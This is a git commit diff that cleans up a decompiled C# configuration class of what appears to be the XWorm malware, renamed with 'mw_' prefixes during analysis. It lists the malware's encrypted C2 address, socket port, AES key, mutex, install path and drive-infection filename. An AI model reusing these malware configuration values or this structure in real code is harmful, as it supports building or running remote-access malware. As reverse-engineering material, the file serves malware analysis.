2428d6686095fcceab547b1b90a6aa7fc99e3a4a
cyb3rjerry <cbrisson@coveo.com>
2024-12-03 17:14:56 -0700

    cleanup

--- Chrome/mw_config.cs
+++ Chrome/mw_config.cs
@@ -4,39 +4,16 @@ using Microsoft.VisualBasic;
 // Token: 0x02000007 RID: 7
 public class mw_config
 {
-	// Token: 0x04000006 RID: 6
 	public static string mw_IPAddress = "ZUJaQY41qR4AqdHYyAP+cA==";
-
-	// Token: 0x04000007 RID: 7
 	public static string mw_currentC2IP;
-
-	// Token: 0x04000008 RID: 8
 	public static string mw_socketPort = "FWd2q7oO16NdAEuty6JKYw==";
-
-	// Token: 0x04000009 RID: 9
 	public static string mw_AESKey = "tmWHapH+yoFkBndjZ/Kolw==";
-
-	// Token: 0x0400000A RID: 10
 	public static string mw_XwormTag = "z8aZlTt4+rgWWWZD6By+1w==";
-
-	// Token: 0x0400000B RID: 11
 	public static int mw_sleepTimeInSeconds = 10;
-
-	// Token: 0x0400000C RID: 12
 	public static string mw_malwareName = "eY4sJECpzuvmd2ufLAP2ug==";
-
-	// Token: 0x0400000D RID: 13
 	public static string mw_driveInfectionFilename = "2fhTCLHIb4RZIBqb+s7wdQ==";
-
-	// Token: 0x0400000E RID: 14
 	public static string mw_InstallPath = "WK+jcFdb8XTpo7pyCZgMgg==";
-
-	// Token: 0x0400000F RID: 15
 	public static string mw_localFilename = "w4/hGV4jqpUOohi9FExK/w==";
-
-	// Token: 0x04000010 RID: 16
 	public static string mw_mutexName = "BM0KFI37PL8w3qNr";
-
-	// Token: 0x04000011 RID: 17
 	public static string mw_logFile = Interaction.Environ("temp") + "\\Log.tmp";
 }
